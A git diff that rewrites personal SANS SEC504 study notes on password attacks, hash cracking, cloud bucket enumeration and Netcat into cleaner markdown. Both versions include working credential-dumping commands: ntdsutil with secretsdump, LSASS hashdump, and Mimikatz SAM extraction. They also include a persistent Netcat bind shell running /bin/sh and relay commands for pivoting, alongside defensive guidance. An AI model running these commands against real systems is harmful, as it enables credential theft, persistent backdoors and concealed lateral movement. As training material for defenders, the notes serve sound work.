@@ -6,272 +6,412 @@ tags: ["sans504"]
 slug: "sec-504/sans504/sec-504-book3"
 ---
 
-password the ultimate prize for an attacker giving him unconditional access and maybe giving him some juicy files to use , here we’ll study how attacker may get there hands in ur lovely passwords and how you can keep them safe. 
+A password is the ultimate prize for an attacker — it gives unconditional access and maybe even some juicy files along the way. Here we'll study how attackers get their hands on your passwords, and how you can keep them safe.
 
-## Password Attacks:
+## Password Attacks
 
-### Password guessing:
+### Password Guessing
 
-our first kind of attack and the most classic one , it starts with getting a valid userID /username , then making list of possible passwords /password list , trying each password , is correct then your in , if not try the next one. of course you will not do this manually you’ll sue scripts you have some conditions  like making one guess each 5 seconds and at most 5gusses per second , so you don't get locked out. miter ID T1110
+Our first kind of attack, and the most classic one. It starts with getting a valid userID/username, then building a list of possible passwords. Try each one — if it's correct, you're in; if not, try the next. Of course, you won't do this manually — you'll use scripts with conditions like one guess every 5 seconds and at most 5 guesses per account, so you don't trigger a lockout. **MITRE ID: T1110.**
 
-### Password Spraying:
+### Password Spraying
 
-to try and avoid account lookout in this technique we have a small list of passwords and a huge list of accounts , so you spray the passwords you have hoping its gonna work with one of the accounts and if it didn't , you just wait for the lookout timer to reset and try anther small list of passwords, and soo one. 
+To avoid account lockouts, this technique flips the ratio: a small list of passwords against a huge list of accounts. You spray your small password list across every account hoping it lands on at least one, then wait for the lockout timer to reset before trying another small batch.
 
-### THC Hydra:
+### THC Hydra
 
-is a password guessing tool it supports tons of protocols , attackers use this tool to test successful usernames and password combination against a a services, it have a loot of moods you can use single name single password , single password multi username, multi password single username, and any other combination you can think of.
+:::tip
+THC Hydra is a password-guessing tool supporting a huge range of protocols. It tests username/password combinations against services and supports several modes: single username/single password, single password against many usernames, multiple passwords against a single username, and any combination in between.
+:::
 
-### Password Guess Selection:
+### Password Guess Selection
 
-here we try and make out password guessing better by taking into considerations factors that can help us like if the compony have a favorite local sports team , or brand that the employees fell connected to, also if the password is reset quarterly (spring, summer, fall, winter) in the password or ever monthly, this technique though very simple but very effective as proven by many pen-testers and is used in a log of hacking campaigns.
+Here we improve our password guessing by factoring in context — does the company have a favorite local sports team or a brand employees feel connected to? Is the password reset quarterly (spring/summer/fall/winter) or monthly? This technique is simple but proven effective across countless pentests and real hacking campaigns.
 
-### Credential Stuffing:
+### Credential Stuffing
 
-what better way to get a password then looking  for already stolen ones, here the attacker get a hang of a huge collection of leaked data from, breaches then he goes around this data looking for a domain like “@sana.org” or a specific name ”joker” , this can help him to get his hands or a organization users passwords , or a specific user who goes by a curtain name.
+What better way to get a password than reusing one that's already been stolen? Here the attacker works through a huge collection of leaked breach data, searching for a domain like `@sans.org` or a specific name like "joker." This can surface an organization's user passwords, or credentials belonging to a specific individual.
 
 ![image.png](./Sec_504_book3/image.png)
 
-## Understanding Password Hashes:
+## Understanding Password Hashes
 
-the practice of saving a password as a plain text , but still system need to verify that the user entered the same password to let him in , so instead of saving the password we save the hash of this password , and when the user enter the password calculate the has if it matches your in.
+Storing a password in plain text is a bad idea, but the system still needs to verify the user entered the correct one. So instead of storing the password itself, we store its hash — and when the user logs in, we hash their input and compare it to the stored value.
 
-### Windows LANMAN Hashes:
+### Windows LANMAN Hashes
 
-this was used in the early versions of windows, it’s very weak and cant stand a password recovery attack , so to start the user enter a max of 14 character password which is then all converted into uppercase then its padded into 14 bytes , afterword's the password is split into 2halfs treated as the DES keys then encrypt this string “KGS!+#$%" then shift+12345 , the use of this hash is an advantage to any attacker because how easy it is to crack it. 
+Used in early Windows versions, LANMAN is very weak and can't withstand a password recovery attack. The process: the user enters a password (max 14 characters), it's converted entirely to uppercase, then padded to 14 bytes. The password is split into two 7-byte halves, each used as a DES key to encrypt a fixed string ("KGS!@#$%"), and the results are concatenated.
 
-### NT Hashes:
+:::caution
+LANMAN's weak construction makes it trivially easy to crack — a huge advantage for any attacker who finds one still in use.
+:::
 
-this is better then LANMAN but still not that good , here an ascii  password is converted into Unicode then hashed using MD4, this have a weakness as they don't use salts making it easier to crack and users using the same password will have the same hash , NT is sometimes referred to as NTLM but its a misnomer, NTLM is a authentication function.
+### NT Hashes
 
-### Salting:
+Better than LANMAN, but still not great. Here an ASCII password is converted to Unicode and hashed using MD4. The weakness: no salting, which means it's easier to crack, and any two users with the same password will produce identical hashes. NT hashes are sometimes called "NTLM hashes," but that's a misnomer — NTLM is actually an authentication protocol, not a hash function.
 
-instead of calculating just the password hash , a salt is added before hashing , a salt is a small random string added to increase the entropy , the salt must be stored as a plain text along with the password hash.  
+### Salting
 
-### Rainbow Tables:
+Instead of just hashing the password, a salt — a small random string — is added before hashing, increasing entropy and defeating precomputed-table attacks. The salt itself is stored in plain text alongside the hash.
 
-leveraging the non salted password weakness , attackers can make a table that calculate passwords and store its hash in tables for direct comparison , making it as simple as get the hash and just search it and you’ll get the matching password, some sites like CrackStation allows you to enter the hash and it gives back the password, when trying to do this with salted password it becomes kind of impossible.
+### Rainbow Tables
 
-### Obtaining Windows Domain Controller Hashes:
+Leveraging the weakness of unsalted hashes, attackers can precompute massive tables mapping passwords to their hashes. Cracking then becomes as simple as looking up the hash and reading off the matching password.
 
-after getting admin access you cant just copy the NTDS.dit file and get is cuz its encrypted using the SYS hive, so to get it you have to us the `ntdsutil` command then use `activate instance ntds` , followed by `ifm`, to get a backup in C:\ntds this dir , afterword you have to use the `secretdump` script to get the hash `secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL` .
+:::tip
+Sites like CrackStation let you paste in a hash and get the plaintext back instantly — for unsalted hashes, at least. Salted passwords make this approach essentially useless.
+:::
 
-### Obtaining Windows 10 Local Password:
+### Obtaining Windows Domain Controller Hashes
 
-first we have to us e this command `migrate -N lsass.exe` to be able to run the `hashdump`to get the hash from the ram , we can also use `reg save hklm\sam sam.hiv && reg save hklm\system system.hiv` then use `c:\tools\mimikatz\x64\mimikatz.exe "lsadump::sam /sam:sam.hiv/system:system.hiv" "exit"` and it’ll print the hash. 
+After getting admin access, you can't just copy `NTDS.dit` directly — it's encrypted using the SYSTEM hive. Instead:
 
-most of the tools will using a common format of *username:userid:LANMAN:NTHASH* , we have to know what an empty LANMAN hash looks like so we don't get fooled by it.
+```bash title="Create an IFM backup of NTDS.dit"
+ntdsutil "activate instance ntds" "ifm" "create full c:\ntdsbak" "quit" "quit"
+```
 
-### UNIX and Linux Passwords:
+This creates a backup containing both `NTDS.dit` and `SYSTEM` in `C:\ntdsbak`. From there, extract the hashes:
 
-in the early days of unix password was stored in  `/etc/passwd` with DES cipher , later its mover into `/etc/shadow`
-but accessed only by a sudo user , later it started using more advanced hashes and added salts.
+```bash title="Extract NTDS hashes with secretsdump"
+secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL
+```
 
-### Decoding UNIX/Linux Password Hashes:
+### Obtaining Windows 10 Local Passwords
 
-in the `/etc/shadow` stores the hashes using the $ as a separator encryption function from 1 to 6, followed by the salt, and finally the hash or encrypted value itself, 
+First, migrate into the LSASS process so you can dump credentials from memory:
+
+```bash title="Migrate into lsass.exe and dump hashes"
+migrate -N lsass.exe
+hashdump
+```
+
+Alternatively, save the relevant registry hives and parse them offline with Mimikatz:
+
+```bash title="Save SAM/SYSTEM hives and extract hashes with Mimikatz"
+reg save hklm\sam sam.hiv && reg save hklm\system system.hiv
+c:\tools\mimikatz\x64\mimikatz.exe "lsadump::sam /sam:sam.hiv /system:system.hiv" "exit"
+```
+
+:::note
+Most tools output hashes in the format `username:userid:LANMAN:NTHASH`. It's worth knowing what an empty LANMAN hash looks like so you don't mistake it for a real one.
+:::
+
+### UNIX and Linux Passwords
+
+In early UNIX, passwords were stored in `/etc/passwd` using DES. Later, hashes moved to `/etc/shadow`, which is readable only by privileged users, and the hashing schemes themselves grew more advanced and added salting.
+
+### Decoding UNIX/Linux Password Hashes
+
+`/etc/shadow` stores hashes using `$` as a field separator: the encryption algorithm identifier (1–6), the salt, and finally the hash itself.
 
 ![image.png](./Sec_504_book3/image_1.png)
 
-### Hashing Rounds:
+### Hashing Rounds
 
-instead of just running the password through the hash once the system will run it for 5000 times making it take a more time to get the password using the hash , and for an attacker each second counts.
+Instead of hashing the password once, the system runs the hash function thousands of times (commonly 5000), making each individual guess more expensive to compute. For an attacker grinding through millions of guesses, every extra round adds up.
 
-after all of this and the rising of tech password cracking is becoming easier as there are now super GPU’s and CPU’s that are available for the public , so now we have to make the hashing harder and harder by increasing rounds or finding new encryption techniques , which focuses in making the cracking more CPU and RAM intensive and harder even for high end computers 
+As GPU and CPU power available to the public keeps growing, password cracking keeps getting easier — which means defenders have to keep raising the cost, either by increasing rounds or adopting memory-hard hashing schemes designed to stay expensive even on high-end hardware.
 
 ![image.png](./Sec_504_book3/image_2.png)
 
-## Password Cracking:
+## Password Cracking
 
-consider the following scenario at attacker compromised a low/med importance system , dumps all hashes stored then crackem and get to a higher importantly user account and boom he got every ting he needs to compromise the whole system. though it seems to straight forward but it happens so lets dive in to understand exactly how can this be done in real life. 
+Consider this scenario: an attacker compromises a low/medium-importance system, dumps every hash stored on it, cracks them, and pivots into a higher-privilege account — and now they have everything they need to compromise the whole environment. It sounds almost too simple, but it happens constantly. Let's break down exactly how.
 
-### John the Ripper:
+### John the Ripper
 
-an open sources cross platform tool, o run it you must feed it password hashes so in Unix you’ll need to feed it the unshadow version of the passwords , on win give it the output of the hashdump  or secretsdump.py.
+An open-source, cross-platform cracking tool. To run it, feed it password hashes — on Unix, you'll need the unshadowed version of the password file; on Windows, feed it the output of `hashdump` or `secretsdump.py`.
 
-### John cracking modes:
+### John Cracking Modes
 
-| Mode |  Argument  | Feature |
+| Mode | Argument | Feature |
 | --- | --- | --- |
-| Single Crack  |  -single | Uses variations of account name, /etc/passwd account information, and more |
-| Wordlist  | -wordlist filename | Uses a dictionary wordlist file with hybrid to generate permutated password guesses |
-| Incremental  | -incremental | Uses brute force guessing |
-| External  | -external | Uses an external program to generate guesses |
-| Default  |  | John applies Single mode, then Word list, then Incremental |
+| Single Crack | `-single` | Uses variations of the account name, `/etc/passwd` info, and more |
+| Wordlist | `-wordlist filename` | Uses a dictionary wordlist with optional mangling rules to generate permutations |
+| Incremental | `-incremental` | Pure brute-force guessing |
+| External | `-external` | Uses an external program to generate guesses |
+| Default | — | John runs Single mode, then Wordlist, then Incremental, in that order |
 
-when u gave john a wrong hash name and hash it will never be able to crack it so , john have an autodetect fetcher to ignore this , in windows sadly you’ll have to specify the type of the password your trying to crack, if john successfully crack a password it will print it into the screen then saves is into a john.pot file. 
+:::note
+If you give John the wrong hash format, it generally won't be able to crack it — though John does include autodetection to help with this. On Windows, you'll usually need to specify the hash type explicitly. Cracked passwords print to the screen and are saved into a `john.pot` file.
+:::
 
-### Hashcat:
+### Hashcat
 
-anther password cracking tool , what's very unique about hash cat is that it uses GPU power to crack making it much much faster, it can also utilize multiple GPU’s to crack a single password.
+Another password-cracking tool. What makes Hashcat unique is its use of GPU power, making it dramatically faster than CPU-based crackers — and it can leverage multiple GPUs to crack a single hash even faster.
 
-### Hashcat Attack Modes:
+### Hashcat Attack Modes
 
-`hashcat -m 1000 -a 0 ./smart-hashdump.txt words.txt` 
+```bash title="Basic Hashcat wordlist attack"
+hashcat -m 1000 -a 0 ./smart-hashdump.txt words.txt
+```
 
--m: spacify the kind of hash your cracking.
+`-m` specifies the hash type you're cracking; `-a` specifies the attack mode, followed by the hash file and then the wordlist.
 
--a for the attack mode, followed by the hash file , then the wordlist
+**Straight (`-a 0`):** uses a wordlist, trying each password in it directly.
 
-**Straight:** `-a 0` uses a wordlist trying each password in it.
+**Combinator (`-a 1`):** takes two wordlists and combines every word from one with every word from the other. If one file has 1 million passwords and the other has just 6, this produces 6 million combined guesses.
 
-**Combinator:** `-a 1`  takes 2 wordlists combine all the words in both files and try them , if a file have 1 million password and the other have only 6 , using this will produce 60 million passwords.
-
-**Mask:** `-a 3` i fell this is in a way similar to regex but instead of searching you fill a space, using the table below we can understand it better.
+**Mask (`-a 3`):** similar in spirit to a regex, but instead of searching, you fill in a template character by character. The table below shows the character classes:
 
 | Marker | Character Sequence |
 | --- | --- |
-| ?l | abcdefghijklmnopqrstuvwxyz |
-| ?u | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
-| ?d | 01234567890123456789 |
-| ?s | «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ |
-| ?a | ?l?u?d?s (all of the abouve) |
+| `?l` | abcdefghijklmnopqrstuvwxyz |
+| `?u` | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
+| `?d` | 0123456789 |
+| `?s` | «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ |
+| `?a` | `?l?u?d?s` (all of the above) |
 
-so lets say we have a password policy of  “You must select a password of at least 8 characters with at least one capital letter, and one number.” we can guess its mostly gona be , a word starts with cubital letter and ends with numberer two so we can use this to try and brute force it, ?u?l?l?l?l?l?d?d 
-****
+:::tip
+Say a company's password policy reads: "You must select a password of at least 8 characters with at least one capital letter and one number." A reasonable guess is that most users will pick a word starting with a capital letter and ending in a number — something like `?u?l?l?l?l?l?d?d` as a mask.
+:::
 
-**Hybrid Wordlist + Mask:** `-a 6` takes a word list and concatenates it with any mask you’ll write, like adding “123”to all the password in the list you have.
-**Hybrid Mask + Wordlist:** `-a 7` same as the last one but instead prepend.
+**Hybrid Wordlist + Mask (`-a 6`):** takes a wordlist and appends a mask to every entry — e.g., adding `123` to the end of every password in the list.
 
-### Hashcat Rules:
+**Hybrid Mask + Wordlist (`-a 7`):** the same idea, but the mask is prepended instead of appended.
 
-add -r to the f a command of cracking a password and it will mutate all the passwords in this list to better guess the password. 
+### Hashcat Rules
 
-here is the top10 rules list of 2025:
+Add `-r` to a cracking command to mutate every password in the wordlist according to a ruleset, generating many more guesses per base word.
 
-| **Rule** | **Description** | **Type/Action** |
+Here's a top-10 rules list for 2025:
+
+| Rule | Description | Type/Action |
 | --- | --- | --- |
-| **`$1`** | Append the character **`1`** to the end of the word. | Append |
-| **`$1 $2`** | Append **`12`** to the end of the word. | Append |
-| **`$1 $2 $3`** | Append **`123`** to the end of the word. | Append |
-| **`c`** | Capitalize the **first letter** of the word. (e.g., `password` ⇒ `Password`) | Case Manipulation |
-| **`u`** | Convert the entire word to **uppercase**. (e.g., `password`⇒ `PASSWORD`) | Case Manipulation |
-| **`$!`** | Append the character **`!`** to the end of the word. | Append |
-| **`d`** | Duplicate the word. (e.g., `word` ⇒ `wordword`) | Duplication |
-| **`so0 si1 se3 ss$ sa@`** | **Multiple substitution rules** run sequentially: `o` with `0` (zero). `i` with `1` (one). `e` with `3`. `s` with `$`. `a` with `@`. | Substitution |
-| **`$2 $0 $2 $5`** | Append the string **`2025`** to the end of the word. | Append |
+| `$1` | Append the character `1` to the end of the word | Append |
+| `$1 $2` | Append `12` to the end of the word | Append |
+| `$1 $2 $3` | Append `123` to the end of the word | Append |
+| `c` | Capitalize the first letter of the word (`password` → `Password`) | Case manipulation |
+| `u` | Convert the entire word to uppercase (`password` → `PASSWORD`) | Case manipulation |
+| `$!` | Append the character `!` to the end of the word | Append |
+| `d` | Duplicate the word (`word` → `wordword`) | Duplication |
+| `so0 si1 se3 ss$ sa@` | Multiple substitutions run sequentially: `o`→`0`, `i`→`1`, `e`→`3`, `s`→`$`, `a`→`@` | Substitution |
+| `$2 $0 $2 $5` | Append the string `2025` to the end of the word | Append |
 
-### Preparation:
+### Preparation
 
-there are some things that we can make to me ourself prepared for a scenario like the one we started this part with , for ***windows*** we can Disable LANMAN Authentication , this can be done by going to the SYSTEM\CurrentControlSet\Control\Lsa  hive and add a NoLMHash key so our password hash will not be stored next time we change it. password complexity use the  Active Directory Users and Computers MMC , enable the *Passwords must meet complexity requirements of installed password filter* settings. also making the password longer is some times better then making is short and complex , finally the reset password every 90 days leads to users making weaker or writing down passwords so just don't use it. ***Unix*** systems have Pluggable Authentication Modules (PAM) so just use them , and be in the safe side.
+A few defensive steps map directly onto the attack scenario we opened with.
 
-finally, deploy ***Multi-Factor Authentication*** , though we can do all the things i just mentioned , the best option is just to add anther layer of security and it’ll save your company millions.
+For **Windows**: disable LANMAN authentication by adding a `NoLMHash` key under `SYSTEM\CurrentControlSet\Control\Lsa`, so future password changes won't generate a LANMAN hash at all. Enforce password complexity through the Active Directory Users and Computers MMC by enabling *Password must meet complexity requirements*. Favor longer passwords over short, complex ones — length tends to beat complexity for actual entropy.
+
+:::warning
+Forcing password resets every 90 days tends to backfire — users respond by picking weaker passwords or writing them down. Avoid mandatory periodic resets unless there's evidence of compromise.
+:::
+
+For **Unix** systems, lean on Pluggable Authentication Modules (PAM) to enforce strong policy.
+
+Finally, deploy **multi-factor authentication**. All the hardening above helps, but MFA is the single layer most likely to save your company from a costly breach.
 
 ![image.png](./Sec_504_book3/image_3.png)
 
-## Domain Password Audit Tool:
+## Domain Password Audit Tool (DPAT)
 
-DPAT a python script for windows or Unix that characterize how users select there password , i fell we can call it a meta data analysis tool for passwords, as i gathers hidden data and makes sense from them.
+DPAT is a Python script (works on Windows or Unix) that characterizes how users select their passwords — essentially a metadata analysis tool that surfaces patterns hidden across an entire password dump.
 
-### Preparation:
+### Preparation
 
- to start we need to extract the NTDS.dit and SYSTEM hives from the domain Controller, this can easily be done using the command `ntdsutil "activate instance ntds" "ifm" "create full c:\ntdsbak" "quit" "quit"`  , this will created this directory if is doesn't exist `c:\ntdsbak` , congaing both NTDS.dit and SYSTEM. Next , we’ll extract a list of Windows Domain groups 
-into txt files each containing a list of users using this command `Get-AdGroup -Filter * | % { Get-AdGroupMember $*.Name |Select-Object -ExpandProperty SamAccountName | Out-File -FilePath"$($*.Name).txt" -Encoding ASCII } Get-AdGroup -Filter * | % { Get-AdGroupMember $*.Name |Select-Object -ExpandProperty SamAccountName | Out-File -FilePath"$($*.Name).txt" -Encoding ASCII }` . next we’ll export the hashes using the Impacket secretsdump.py script, and this command  `secretsdump.py -system “registry/SYSTEM” -ntds "ActiveDirectory/ntds.dit" LOCAL -outputfile customer -history` , afterwards we will crack the extracted passwords using Hashcat `hashcat -m 3000 -a 3 customer.ntds --potfile-path hashcat.potfile -1 ?u?d?s --increment ?1?1?1?1?1?1?1`   ,   `hashcat -m 1000 -a 0 customer.ntds wordlist.txt --potfile-path ./hashcat.potfile`, u should customize the password guessing as much as u can knowing the company policy to crack as much passwords.
+Start by extracting `NTDS.dit` and the `SYSTEM` hive from the domain controller:
 
-### run it:
+```bash title="Create an IFM backup for DPAT analysis"
+ntdsutil "activate instance ntds" "ifm" "create full c:\ntdsbak" "quit" "quit"
+```
 
-all of this was the preparation for running the DPAT , now lets run it using this command `python dpat.py -n ../ntdsbak/customer.ntds -c ../ntdsbak/hashcat.potfile -g ../ntdsbak/*.txt`, afterword it will produce the report.
+This creates `c:\ntdsbak` (if it doesn't already exist), containing both `NTDS.dit` and `SYSTEM`.
 
-the overview shows us a quick view of what the report found as followed 
+Next, export a list of Windows domain groups, each to its own text file of member usernames:
+
+```bash title="Export AD group membership to text files"
+Get-ADGroup -Filter * | % { Get-ADGroupMember $_.Name | Select-Object -ExpandProperty SamAccountName | Out-File -FilePath "$($_.Name).txt" -Encoding ASCII }
+```
+
+Then export the hashes with Impacket's `secretsdump.py`:
+
+```bash title="Export domain hashes with secretsdump"
+secretsdump.py -system "registry/SYSTEM" -ntds "ActiveDirectory/ntds.dit" LOCAL -outputfile customer -history
+```
+
+Crack the extracted hashes with Hashcat:
+
+```bash title="Mask attack against NTDS hashes"
+hashcat -m 3000 -a 3 customer.ntds --potfile-path hashcat.potfile -1 ?u?d?s --increment ?1?1?1?1?1?1?1
+```
+
+```bash title="Wordlist attack against NTDS hashes"
+hashcat -m 1000 -a 0 customer.ntds wordlist.txt --potfile-path ./hashcat.potfile
+```
+
+:::tip
+Customize your guessing strategy as much as possible based on the company's actual password policy — the closer your masks and wordlists match real-world patterns, the more you'll crack.
+:::
+
+### Run It
+
+With preparation complete, run DPAT itself:
+
+```bash title="Run DPAT against cracked hashes and group lists"
+python dpat.py -n ../ntdsbak/customer.ntds -c ../ntdsbak/hashcat.potfile -g ../ntdsbak/*.txt
+```
+
+This produces the full report.
+
+The overview gives a quick summary of what the report found:
 
 ![image.png](./Sec_504_book3/image_4.png)
 
 ![image.png](./Sec_504_book3/image_5.png)
 
-we can see passwords length , and count 
+We can see password length distribution and counts.
 
-top passwords , which can revel a lot of info to us , like the default password used by the IT
+Top passwords can reveal a lot — including default passwords set by IT that never got changed.
 
 ![image.png](./Sec_504_book3/image_6.png)
 
-we can also get most occurring hashes so even if it was not cracked we can see if employees have duplicate passwords, and much more like domain group analysis , historical analysis, and much more. 
+We can also see the most commonly occurring hashes, which surfaces password reuse across employees even for hashes that weren't cracked — plus domain group analysis, historical analysis, and more.
 
 ![image.png](./Sec_504_book3/image_7.png)
 
 ## Cloud Spotlight: Insecure Storage
 
-Amazon S3 buckets, Google Cloud buckets, and Azure Blob storage  , are all fundamentals in the new age where every thing is store in cloud , in the early days of AWS it was a default setting that the all data was public access , but it was later changed. even until now some buckets are left un protected , why is that this all happens because of the lack of understanding where admin just don't care or don't understand how important security is. 
+Amazon S3 buckets, Google Cloud Storage buckets, and Azure Blob Storage are foundational to how everything gets stored in the cloud today. In AWS's early days, buckets defaulted to public access — that's since changed, but plenty of buckets are still left unprotected today, usually because admins either don't understand or don't prioritize the security implications.
 
-some of the settings in AWS
+Some of the relevant AWS settings:
 
 ![image.png](./Sec_504_book3/image_8.png)
 
-### Cloud Storage Access:
+### Cloud Storage Access
 
-all cloud providers use HTTP to let you access the data , the end points are the same for each service , while changing some data, 
+All cloud providers expose data over HTTP using broadly similar endpoint patterns:
 
-`https://s3.amazonaws.com/BUCKETNAME`
+```
+https://s3.amazonaws.com/BUCKETNAME
+https://ACCOUNTNAME.blob.core.windows.net/CONTAINERNAME
+https://www.googleapis.com/storage/v1/b/BUCKETNAME
+```
 
-`https://ACCOUNTNAME.blob.core.windows.net/CONTAINERNAME`
+An attacker who can guess the bucket name can often access the data directly — which makes enumeration the key technique here.
 
-`https://www.googleapis.com/storage/v1/b/BUCKETNAME`
+### Scanning AWS S3
 
-an attacker can easily access the data if he can guess the bucket name , this can be done using enumeration.
+:::tip
+**Bucket Finder** enumerates AWS S3 buckets — feed it a wordlist of candidate bucket names and it checks whether each exists and whether it's public. It can also download data from any buckets it finds open.
+:::
 
-### Scanning AWS S3:
+### Scanning Google Cloud Storage
 
-**Bucket Finder** is a tool for enumerating AWS S3 buckets , you just feet it a word list of bucker names you want to search for it test if it exist and if its public, you can also download data from buckets if you want to.
+GCPBucketBrute can identify whether a bucket exists and enumerate the permissions attached to it, searching by wordlist or a single name. Downloading contents requires Google's `gsutil` tool separately.
 
-### Scanning Google Compute Bucket:
+### Azure Scanning
 
-GCPBucketBrute can identify if the bucker exists and also enumerate the permissions associated with a bucket , searching bucket name using a wordlist or even a single word, but for download we’ll have to use gsutil tool from Google.
+Basic Blob Finder takes a list of colon-separated strings — the first part is the account name, the second is the container name — and surfaces publicly accessible containers along with their files.
 
-### Azure Scanning:
+:::tip
+Creative bucket naming conventions can help you cover more ground: permute the company name with common rules, or use OSINT to surface naming patterns that lead to undiscovered buckets.
+:::
 
-Basic Blob Finder, takes a list of stings separated by a colon the 1st word is the account name then the 2rd is the container name, it can gather publicly buckets and all the files in them
+You should periodically scan your own organization's cloud footprint using these techniques — just make sure you're doing so legally, and that what you find is actually actionable. DNS, HTTP headers, and network traffic can all help identify which cloud provider is in use, so even a simple packet capture can be a useful starting point.
 
-creative bucket naming , you can make  like some rules so you can cover all possible bucket name a company may use , using rules to permutate a company name , or using OSINT can lead you to discovering some juicy buckets, you should also scan your organization cloud using the techniques mentioned here, but make s your doing in legally , and make sure the info you got is actually useful , DNS http and network can easily help you identify the cloud service provider, so a simple packer capture can help u a ton, and of course enable logging , it may need another bucket to save all the data to and may be not the easiest to deal with buts it’ll be very useful for the IR team.
+:::warning
+Enabling logging for cloud storage may require a separate bucket to receive the logs, and it's not always the easiest thing to wire up — but it's extremely valuable for the IR team when something does go wrong.
+:::
 
 ![image.png](./Sec_504_book3/image_9.png)
 
-## Netcat:
+## Netcat
 
-net cat is a tool made back in 1996, a 30 year old tool that till this day still used, though it have much copies like Ncat ,GNU Netcat. 
+Netcat was built back in 1996 — a tool now nearly 30 years old that's still in active use today, alongside spinoffs like Ncat and GNU Netcat.
 
-to start of we need to know that it have two moods Client which u gave a Ip and port to connect to , and u can then pipe the dana flowing to you to anther thing, and Listener mood which use the `-l` option which makes it listen to a port UDP or TCP and receives any packets on that port where u can then pipe to any app u want , or just read them in ur screen. clients start the connection, while listeners wait for them to arrive.
+Netcat has two modes: **client** mode, where you give it an IP and port to connect to and pipe data to/from that connection, and **listener** mode (`-l`), where it listens on a TCP or UDP port and can pipe received data to another application or just print it to the screen. Clients initiate connections; listeners wait for them to arrive.
 
-Netcat uses:
+### Data Transfer (Moving Files)
 
-### Data transfer (moving files):
+:::note
+You can run Netcat over a port like 53 to make traffic superficially resemble normal DNS packets — useful for evading naive port-based filtering.
+:::
 
-you can transferee data over a port 35 to make it look like normal DNS  packets , 
+To send data from a listener to a client:
 
-to get data from listener to a client we’ll use:
+```bash title="Listener sends a file"
+nc -l -p 1234 < filename
+```
 
-listener: `nc -l -p 1234 < filename`
+```bash title="Client receives the file"
+nc listenerIP 1234 > filename
+```
 
-client: `nc listenerIP 1234 > filename`
+To send data from a client to a listener:
 
-from client to listener:
+```bash title="Listener receives a file"
+nc -l -p 1234 > filename
+```
 
-listener: `nc -l -p 1234 > filename`
+```bash title="Client sends the file"
+nc listenerIP 1234 < filename
+```
 
-client: `nc listenerIP 1234 < filename`
+### Port Scanning
 
-### Port scanning:
+```bash title="Basic port scan with netcat"
+nc -v -w3 -z targetIP startport-endport
+```
 
-using this command `nc -v -w3 -z targetIP startport-endport`  where the `-v` tells us if a connection was made , `-w3` only wait 3 seconds for the response , `-z` to send minimal data  , then this IP to scan , and range to scan for , we can originate our data from a port using the `-p` command.
+`-v` reports whether a connection was made, `-w3` waits at most 3 seconds for a response, `-z` sends minimal/no data, and the IP/port-range arguments specify the scan target. You can also originate traffic from a specific source port using `-p`.
 
-### Backdoors:
+### Backdoors
 
-we can be provided a login shell, by setting up a listener and activating `-e` , so it runs a shell.  when using the `-l` Netcan listen only one time , but if we use the `-L` it will run continuously but this only works in windows for Linux we have to make a command like this `while [ 1 ]; do echo "Started"; nc -l -p [port] -e /bin/sh; done` or save this into a listener.sh  and run `nohup ./listener.sh &` which makes it run even if the user is logged out.
+:::caution
+Netcat can be used to spawn a login shell by combining a listener with `-e`, which executes a shell on connection. With `-l`, Netcat listens for exactly one connection and then exits; `-L` (Windows-only) makes it listen continuously.
+:::
 
-### Relays:
+On Linux, since `-L` isn't available, a continuous listener can be emulated with a loop:
 
-make anther computer copies exactly what your doing over the internet , so u can use it to connect to a compromised computer and use it to make you attacks so u don't get backtracked , so from the attacker device he runs `nc 10.10.10.10 2222` , then run `nc –l –p 2222 | nc 10.10.10.100 80` , on the compromised machine then do whatever he likes. this can help him bypass firewalls and obfuscate the attack but this is only a one way relay
+```bash title="Persistent netcat listener on Linux"
+while [ 1 ]; do echo "Started"; nc -l -p [port] -e /bin/sh; done
+```
+
+Save this as `listener.sh` and run it detached so it survives logout:
+
+```bash title="Run the listener script detached from the session"
+nohup ./listener.sh &
+```
+
+### Relays
+
+A relay makes one machine forward traffic exactly as instructed, which lets an attacker route through a compromised host to obscure the true origin of their traffic. From the attacker's machine:
+
+```bash title="Attacker connects to the relay"
+nc 10.10.10.10 2222
+```
+
+On the compromised (relay) machine:
+
+```bash title="Relay forwards traffic to the final target"
+nc -l -p 2222 | nc 10.10.10.100 80
+```
+
+This lets the attacker interact with the final target through the relay, helping bypass firewalls and obscure attribution — but note this is a one-way relay only.
 
 ![image.png](./Sec_504_book3/image_10.png)
 
-we can easily make a 2 way Relay in Linux, to start of we’ll create a named pipe `mkfifo backpipe` , which can help us pass data around , next we’ll make this `nc -l -p 2222 < backpipe | nc 10.10.10.100 80 > backpipe` which listen to the attacker , which is feed to the client , sent it then it come back and sent over to the listener using the named pipe.
+A two-way relay on Linux is also possible. First, create a named pipe to move data bidirectionally:
 
-### defending Netcat:
+```bash title="Create a named pipe for a two-way relay"
+mkfifo backpipe
+```
 
-Data Transfer & Backdoors: monitor what's running on your systems. investigate process showing unusual port activity.
+```bash title="Two-way relay using the named pipe"
+nc -l -p 2222 < backpipe | nc 10.10.10.100 80 > backpipe
+```
 
-Port Scanners & Connecting to Open Ports: closing all unused ports. Only keep ports open that are required for normal operations.
+This listens for the attacker's connection, feeds incoming data to the client connection, and routes the response back through the named pipe to the original listener.
 
-Relays & Network Pivoting: Strengthen your internal network design with layered security. Use internal firewalls to create strategic chokepoints. Use Private VLANs (PVLANs) to isolate hosts and restrict lateral movement.
+### Defending Against Netcat
+
+**Data transfer & backdoors:** monitor what's actually running on your systems, and investigate any process showing unusual port activity.
+
+**Port scanners & connections to open ports:** close every port you don't need. Keep open only what's required for normal operations.
+
+**Relays & network pivoting:** strengthen internal network segmentation with layered security. Use internal firewalls to create strategic chokepoints, and use Private VLANs (PVLANs) to isolate hosts and restrict lateral movement.
 
 ![image.png](./Sec_504_book3/image_11.png)
 
-**done الحمدلله**
+**الحمد لله done**
